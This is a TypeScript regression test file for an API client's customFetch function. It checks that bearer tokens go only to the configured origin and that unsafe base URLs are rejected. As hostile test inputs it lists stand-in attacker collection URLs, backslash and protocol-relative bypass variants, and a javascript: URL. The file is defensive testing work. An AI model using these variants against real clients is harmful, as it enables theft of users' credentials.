import assert from "node:assert/strict";
import test, { afterEach } from "node:test";
import {
  customFetch,
  setAuthTokenGetter,
  setBaseUrl,
} from "../../../lib/api-client-react/src/custom-fetch";

const originalFetch = globalThis.fetch;

afterEach(() => {
  globalThis.fetch = originalFetch;
  setAuthTokenGetter(null);
  setBaseUrl(null);
});

test("does not attach bearer credentials to a third-party absolute URL", async () => {
  let authorization: string | null = null;
  globalThis.fetch = async (_input, init) => {
    authorization = new Headers(init?.headers).get("authorization");
    return new Response("ok", {
      headers: { "content-type": "text/plain" },
    });
  };

  setBaseUrl("https://api.example.test");
  setAuthTokenGetter(() => "regression-token");
  await customFetch<string>("https://attacker.example.test/collect", {
    responseType: "text",
  });

  assert.equal(authorization, null);
});

test("does not trust network-path or backslash URL variants", async () => {
  let authorization: string | null = null;
  globalThis.fetch = async (_input, init) => {
    authorization = new Headers(init?.headers).get("authorization");
    return new Response("ok", {
      headers: { "content-type": "text/plain" },
    });
  };

  const previousLocation = Object.getOwnPropertyDescriptor(
    globalThis,
    "location",
  );
  Object.defineProperty(globalThis, "location", {
    configurable: true,
    value: {
      href: "https://app.example.test/dashboard",
      origin: "https://app.example.test",
    },
  });

  try {
    setBaseUrl(null);
    setAuthTokenGetter(() => "regression-token");
    for (const hostileUrl of [
      "//attacker.example.test/collect",
      String.raw`/\\attacker.example.test/collect`,
      String.raw`\\attacker.example.test/collect`,
      String.raw`https:\\attacker.example.test/collect`,
    ]) {
      authorization = null;
      await customFetch<string>(hostileUrl, { responseType: "text" });
      assert.equal(authorization, null, hostileUrl);
    }
  } finally {
    if (previousLocation) {
      Object.defineProperty(globalThis, "location", previousLocation);
    } else {
      delete (globalThis as { location?: unknown }).location;
    }
  }
});

test("attaches bearer credentials to the configured API origin", async () => {
  let authorization: string | null = null;
  globalThis.fetch = async (_input, init) => {
    authorization = new Headers(init?.headers).get("authorization");
    return new Response("ok", {
      headers: { "content-type": "text/plain" },
    });
  };

  setBaseUrl("https://api.example.test/base");
  setAuthTokenGetter(() => "regression-token");
  await customFetch<string>("/status", { responseType: "text" });

  assert.equal(authorization, "Bearer regression-token");
});

test("rejects unsafe API base URLs before they can receive credentials", () => {
  assert.throws(
    () => setBaseUrl("javascript:alert(1)"),
    /absolute HTTP\(S\) URL/i,
  );
  assert.throws(
    () => setBaseUrl("https://user:password@api.example.test"),
    /without credentials/i,
  );
});